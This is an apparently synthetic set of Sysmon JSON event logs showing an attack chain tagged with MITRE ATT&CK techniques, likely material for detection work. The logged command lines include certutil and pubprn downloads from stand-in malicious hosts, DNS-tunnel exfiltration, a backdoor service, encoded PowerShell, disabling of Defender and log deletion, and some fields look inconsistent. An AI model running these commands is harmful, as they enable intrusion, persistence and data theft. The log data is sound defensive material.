{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation23.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T02:05:55.789Z"}}, "EventData": {"RuleName": "technique_id=T1057,technique_name=Process Discovery", "UtcTime": "2026-01-03 02:05:55.789", "ProcessGuid": "{a23d45b-6baa-5d6a-0000-00106e8e1e00}", "ProcessId": "5244", "Image": "C:\\Windows\\System32\\tasklist.exe", "CommandLine": "tasklist /v", "CurrentDirectory": "C:\\temp\\", "User": "CORP\\Attacker", "LogonGuid": "{a23d45b-6ba9-5d6a-0000-00205f8d1e00}", "LogonId": "0x1e8d5f", "TerminalSessionId": "1", "IntegrityLevel": "Medium", "Hashes": "SHA256=EF1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890123", "ParentProcessGuid": "{a23d45b-6ba8-5d6a-0000-001050.8c1e00}", "ParentProcessId": "4788", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 22, "Computer": "workstation24.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T02:30:10.012Z"}}, "EventData": {"RuleName": "technique_id=T1048.003,technique_name=Exfiltration Over Alternative Protocol", "UtcTime": "2026-01-03 02:30:10.012", "ProcessGuid": "{a23d45b-6cbb-5d6a-0000-00107f9f1f00}", "ProcessId": "3456", "QueryName": "ZGF0YS10by1leGZpbC5leGFtcGxlLmNvbQ.tunnel.evil-dns.com", "QueryStatus": "0", "QueryResults": "type:  5 198.51.100.22;", "Image": "C:\\temp\\exfiltool.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation25.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T02:55:45.345Z"}}, "EventData": {"RuleName": "technique_id=T1569.002,technique_name=Service Execution", "UtcTime": "2026-01-03 02:55:45.345", "ProcessGuid": "{a23d45b-6dcc-5d6a-0000-001090a02000}", "ProcessId": "2344", "Image": "C:\\Windows\\System32\\sc.exe", "CommandLine": "sc create EvilService binPath= \"C:\\temp\\backdoor.exe\" start= auto", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "CORP\\LocalAdmin", "LogonGuid": "{a23d45b-6dcb-5d6a-0000-002081a02000}", "LogonId": "0x20a081", "TerminalSessionId": "1", "IntegrityLevel": "High", "Hashes": "SHA256=F1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF12345678901234", "ParentProcessGuid": "{a23d45b-6dca-5d6a-0000-001072a02000}", "ParentProcessId": "1876", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 11, "Computer": "workstation26.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T03:20:33.678Z"}}, "EventData": {"RuleName": "technique_id=T1547.001,technique_name=Registry Run Keys", "UtcTime": "2026-01-03 03:20:33.678", "ProcessGuid": "{a23d45b-6edd-5d6a-0000-0010a1b12100}", "ProcessId": "4788", "Image": "C:\\Windows\\System32\\cmd.exe", "TargetFilename": "C:\\Users\\Rachel\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\persistence.bat", "CreationUtcTime": "2026-01-03 03:20:33.678"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "dc01.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T03:45:22.901Z"}}, "EventData": {"RuleName": "technique_id=T1482,technique_name=Domain Trust Discovery", "UtcTime": "2026-01-03 03:45:22.901", "ProcessGuid": "{a23d45b-6fee-5d6a-0000-0010b2c22200}", "ProcessId": "5012", "Image": "C:\\Windows\\System32\\nltest.exe", "CommandLine": "nltest /domain_trusts /all_trusts", "CurrentDirectory": "C:\\temp\\", "User": "CORP\\Attacker", "LogonGuid": "{a23d45b-6fed-5d6a-0000-0020a3c12200}", "LogonId": "0x22c1a3", "TerminalSessionId": "1", "IntegrityLevel": "Medium", "Hashes": "SHA256=1234567890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCD", "ParentProcessGuid": "{a23d45b-6fec-5d6a-0000-001094c02200}", "ParentProcessId": "3788", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 3, "Computer": "workstation27.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T04:10:55.234Z"}}, "EventData": {"RuleName": "technique_id=T1021.002,technique_name=SMB/Windows Admin Shares", "UtcTime": "2026-01-03 04:10:55.234", "ProcessGuid": "{a23d45b-70ff-5d6a-0000-0010c3d32300}", "ProcessId": "1256", "Image": "C:\\Windows\\System32\\net.exe", "User": "CORP\\Attacker", "Protocol": "tcp", "Initiated": "true", "SourceIsIpv6": "false", "SourceIp": "192.168.10.105", "SourceHostname": "workstation27.corp.local", "SourcePort": "52411", "SourcePortName": "-", "DestinationIsIpv6": "false", "DestinationIp": "192.168.10.50", "DestinationHostname": "fileserver01.corp.local", "DestinationPort": "445", "DestinationPortName": "microsoft-ds"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation28.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T04:35:10.567Z"}}, "EventData": {"RuleName": "technique_id=T1047,technique_name=Windows Management Instrumentation", "UtcTime": "2026-01-03 04:35:10.567", "ProcessGuid": "{a23d45b-7110-5d6a-0000-0010d4e42400}", "ProcessId": "3456", "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe", "CommandLine": "wmic process call create \"cmd.exe /c powershell.exe -enc <base64_payload>\"", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "CORP\\LocalAdmin", "LogonGuid": "{a23d45b-710f-5d6a-0000-0020c5e32400}", "LogonId": "0x24e3c5", "TerminalSessionId": "1", "IntegrityLevel": "High", "Hashes": "SHA256=234567890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDE", "ParentProcessGuid": "{a23d45b-710e-5d6a-0000-0010b6e22400}", "ParentProcessId": "2788", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 10, "Computer": "workstation29.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T05:00:44.890Z"}}, "EventData": {"RuleName": "technique_id=T1055.001,technique_name=Dynamic-link Library Injection", "UtcTime": "2026-01-03 05:00:44.890", "SourceProcessGUID": "{a23d45b-7221-5d6a-0000-0010e5f52500}", "SourceProcessId": "4224", "SourceThreadId": "3912", "SourceImage": "C:\\temp\\injector.exe", "TargetProcessGUID": "{a23d45b-7220-5d6a-0000-0010d7f42500}", "TargetProcessId": "2344", "TargetImage": "C:\\Windows\\System32\\notepad.exe", "GrantedAccess": "0x1FFFFF", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+b34c5|C:\\Windows\\System32\\KERNELBASE.dll+4ed5f|C:\\temp\\injector.exe+3c6d"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation30.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T05:25:33.123Z"}}, "EventData": {"RuleName": "technique_id=T1140,technique_name=Deobfuscate/Decode Files or Information", "UtcTime": "2026-01-03 05:25:33.123", "ProcessGuid": "{a23d45b-7332-5d6a-0000-0010f6062600}", "ProcessId": "5132", "Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache -split -f http://malicious-site.com/payload.exe C:\\temp\\payload.exe", "CurrentDirectory": "C:\\temp\\", "User": "CORP\\User02", "LogonGuid": "{a23d45b-7331-5d6a-0000-0020e7052600}", "LogonId": "0x2605e7", "TerminalSessionId": "1", "IntegrityLevel": "Medium", "Hashes": "SHA256=34567890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF", "ParentProcessGuid": "{a23d45b-7330-5d6a-0000-0010d9042600}", "ParentProcessId": "3788", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 13, "Computer": "workstation31.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T05:50:22.456Z"}}, "EventData": {"RuleName": "technique_id=T1562.001,technique_name=Disable or Modify Tools", "EventType": "SetValue", "UtcTime": "2026-01-03 05:50:22.456", "ProcessGuid": "{a23d45b-7443-5d6a-0000-001007172700}", "ProcessId": "2788", "Image": "C:\\temp\\malware.exe", "TargetObject": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware", "Details": "DWORD (0x00000001)"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation32.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T06:15:55.789Z"}}, "EventData": {"RuleName": "technique_id=T1012,technique_name=Query Registry", "UtcTime": "2026-01-03 06:15:55.789", "ProcessGuid": "{a23d45b-7554-5d6a-0000-001018282800}", "ProcessId": "4456", "Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", "CurrentDirectory": "C:\\temp\\", "User": "CORP\\Attacker", "LogonGuid": "{a23d45b-7553-5d6a-0000-002009272800}", "LogonId": "0x282709", "TerminalSessionId": "1", "IntegrityLevel": "Medium", "Hashes": "SHA256=4567890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF1", "ParentProcessGuid": "{a23d45b-7552-5d6a-0000-0010fa262800}", "ParentProcessId": "3456", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation33.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T06:40:10.012Z"}}, "EventData": {"RuleName": "technique_id=T1070.004,technique_name=File Deletion", "UtcTime": "2026-01-03 06:40:10.012", "ProcessGuid": "{a23d45b-7665-5d6a-0000-001029392900}", "ProcessId": "2344", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c del /f /q C:\\temp\\*.log", "CurrentDirectory": "C:\\temp\\", "User": "CORP\\Attacker", "LogonGuid": "{a23d45b-7664-5d6a-0000-00201a382900}", "LogonId": "0x29381a", "TerminalSessionId": "1", "IntegrityLevel": "Medium", "Hashes": "SHA256=567890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF12", "ParentProcessGuid": "{a23d45b-7663-5d6a-0000-00100b372900}", "ParentProcessId": "1876", "ParentImage": "C:\\temp\\cleanup.exe", "ParentCommandLine": "cleanup.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation34.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T07:05:45.345Z"}}, "EventData": {"RuleName": "technique_id=T1083,technique_name=File and Directory Discovery", "UtcTime": "2026-01-03 07:05:45.345", "ProcessGuid": "{a23d45b-7776-5d6a-0000-00103a4a2a00}", "ProcessId": "5012", "Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c dir C:\\Users\\ /s /b | findstr /i password", "CurrentDirectory": "C:\\temp\\", "User": "CORP\\Attacker", "LogonGuid": "{a23d45b-7775-5d6a-0000-00202b492a00}", "LogonId": "0x2a492b", "TerminalSessionId": "1", "IntegrityLevel": "Medium", "Hashes": "SHA256=67890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF123", "ParentProcessGuid": "{a23d45b-7774-5d6a-0000-00101c482a00}", "ParentProcessId": "4224", "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentCommandLine": "powershell.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 22, "Computer": "workstation35.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T07:30:33.678Z"}}, "EventData": {"RuleName": "technique_id=T1568.002,technique_name=Domain Generation Algorithms", "UtcTime": "2026-01-03 07:30:33.678", "ProcessGuid": "{a23d45b-7887-5d6a-0000-00104b5b2b00}", "ProcessId": "3788", "QueryName": "xyzabc123def456.dynamicmalware.net", "QueryStatus": "0", "QueryResults": "type:  5 192.0.2.150;", "Image": "C:\\Users\\Kate\\AppData\\Local\\Temp\\botnet.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "dc01.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T07:55:22.901Z"}}, "EventData": {"RuleName": "technique_id=T1069.002,technique_name=Domain Groups", "UtcTime": "2026-01-03 07:55:22.901", "ProcessGuid": "{a23d45b-7998-5d6a-0000-00105c6c2c00}", "ProcessId": "4788", "Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net group /domain", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "CORP\\User03", "LogonGuid": "{a23d45b-7997-5d6a-0000-00204d6b2c00}", "LogonId": "0x2c6b4d", "TerminalSessionId": "2", "IntegrityLevel": "Medium", "Hashes": "SHA256=7890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF1234", "ParentProcessGuid": "{a23d45b-7996-5d6a-0000-00103e6a2c00}", "ParentProcessId": "3912", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 3, "Computer": "workstation36.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T08:20:55.234Z"}}, "EventData": {"RuleName": "technique_id=T1219,technique_name=Remote Access Software", "UtcTime": "2026-01-03 08:20:55.234", "ProcessGuid": "{a23d45b-7aa9-5d6a-0000-00106d7d2d00}", "ProcessId": "2788", "Image": "C:\\Program Files\\TeamViewer\\TeamViewer.exe", "User": "CORP\\User04", "Protocol": "tcp", "Initiated": "true", "SourceIsIpv6": "false", "SourceIp": "192.168.10.120", "SourceHostname": "workstation36.corp.local", "SourcePort": "49834", "SourcePortName": "-", "DestinationIsIpv6": "false", "DestinationIp": "185.150.100.45", "DestinationHostname": "relay.teamviewer.com", "DestinationPort": "5938", "DestinationPortName": "-"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation37.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T08:45:10.567Z"}}, "EventData": {"RuleName": "technique_id=T1003.006,technique_name=DCSync", "UtcTime": "2026-01-03 08:45:10.567", "ProcessGuid": "{a23d45b-7bba-5d6a-0000-00107e8e2e00}", "ProcessId": "3456", "Image": "C:\\Windows\\System32\\lsass.exe", "CommandLine": "C:\\Windows\\system32\\lsass.exe", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "NT AUTHORITY\\SYSTEM", "LogonGuid": "{a23d45b-4e1d-5d6a-0000-0020e7030000}", "LogonId": "0x3e7", "TerminalSessionId": "0", "IntegrityLevel": "System", "Hashes": "SHA256=890ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF12345", "ParentProcessGuid": "{a23d45b-4e1c-5d6a-0000-001070010000}", "ParentProcessId": "624", "ParentImage": "C:\\Windows\\System32\\wininit.exe", "ParentCommandLine": "wininit.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 11, "Computer": "workstation38.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T09:10:44.890Z"}}, "EventData": {"RuleName": "technique_id=T1204.002,technique_name=Malicious File", "UtcTime": "2026-01-03 09:10:44.890", "ProcessGuid": "{a23d45b-7ccb-5d6a-0000-00108f9f2f00}", "ProcessId": "5132", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\ProgramData\\evil.ps1", "CreationUtcTime": "2026-01-03 09:10:44.890"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation39.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T09:35:33.123Z"}}, "EventData": {"RuleName": "technique_id=T1216.001,technique_name=PubPrn", "UtcTime": "2026-01-03 09:35:33.123", "ProcessGuid": "{a23d45b-7ddc-5d6a-0000-0010a0a03000}", "ProcessId": "4224", "Image": "C:\\Windows\\System32\\cscript.exe", "CommandLine": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs 127.0.0.1 script:http://evil-site.com/payload.sct", "CurrentDirectory": "C:\\temp\\", "User": "CORP\\User05", "LogonGuid": "{a23d45b-7ddb-5d6a-0000-002091a03000}", "LogonId": "0x30a091", "TerminalSessionId": "1", "IntegrityLevel": "Medium", "Hashes": "SHA256=90ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF123456", "ParentProcessGuid": "{a23d45b-7dda-5d6a-0000-001083a03000}", "ParentProcessId": "2788", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 13, "Computer": "workstation40.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T10:00:22.456Z"}}, "EventData": {"RuleName": "technique_id=T1547.014,technique_name=Active Setup", "EventType": "SetValue", "UtcTime": "2026-01-03 10:00:22.456", "ProcessGuid": "{a23d45b-7eed-5d6a-0000-0010b1b13100}", "ProcessId": "3788", "Image": "C:\\temp\\installer.exe", "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{12345678-1234-1234-1234-123456789012}\\StubPath", "Details": "C:\\temp\\malware.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation41.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T10:25:55.789Z"}}, "EventData": {"RuleName": "technique_id=T1033,technique_name=System Owner/User Discovery", "UtcTime": "2026-01-03 10:25:55.789", "ProcessGuid": "{a23d45b-7ffe-5d6a-0000-0010c2c23200}", "ProcessId": "5012", "Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami /all", "CurrentDirectory": "C:\\temp\\", "User": "CORP\\Attacker", "LogonGuid": "{a23d45b-7ffd-5d6a-0000-0020b3c13200}", "LogonId": "0x32c1b3", "TerminalSessionId": "1", "IntegrityLevel": "Medium", "Hashes": "SHA256=0ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF1234567", "ParentProcessGuid": "{a23d45b-7ffc-5d6a-0000-0010a4c03200}", "ParentProcessId": "4456", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "workstation42.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T10:50:10.012Z"}}, "EventData": {"RuleName": "technique_id=T1016,technique_name=System Network Configuration Discovery", "UtcTime": "2026-01-03 10:50:10.012", "ProcessGuid": "{a23d45b-800f-5d6a-0000-0010d3d33300}", "ProcessId": "2344", "Image": "C:\\Windows\\System32\\ipconfig.exe", "CommandLine": "ipconfig /all", "CurrentDirectory": "C:\\temp\\", "User": "CORP\\Attacker", "LogonGuid": "{a23d45b-800e-5d6a-0000-0020c4d23300}", "LogonId": "0x33d2c4", "TerminalSessionId": "1", "IntegrityLevel": "Medium", "Hashes": "SHA256=ABCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF12345678", "ParentProcessGuid": "{a23d45b-800d-5d6a-0000-0010b5d13300}", "ParentProcessId": "3788", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
{"Event": {"System": {"Provider": {"Name": "Microsoft-Windows-Sysmon", "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"}, "EventID": 1, "Computer": "dc01.corp.local", "TimeCreated": {"SystemTime": "2026-01-03T11:15:45.345Z"}}, "EventData": {"RuleName": "technique_id=T1018,technique_name=Remote System Discovery", "UtcTime": "2026-01-03 11:15:45.345", "ProcessGuid": "{a23d45b-8120-5d6a-0000-0010e4e43400}", "ProcessId": "4788", "Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net view /domain", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "CORP\\Attacker", "LogonGuid": "{a23d45b-811f-5d6a-0000-0020d5e33400}", "LogonId": "0x34e3d5", "TerminalSessionId": "1", "IntegrityLevel": "Medium", "Hashes": "SHA256=BCDEF1234567890ABCDEF123456789012ABCDEF1234567890ABCDEF123456789", "ParentProcessGuid": "{a23d45b-811e-5d6a-0000-0010c6e23400}", "ParentProcessId": "3912", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe"}}}
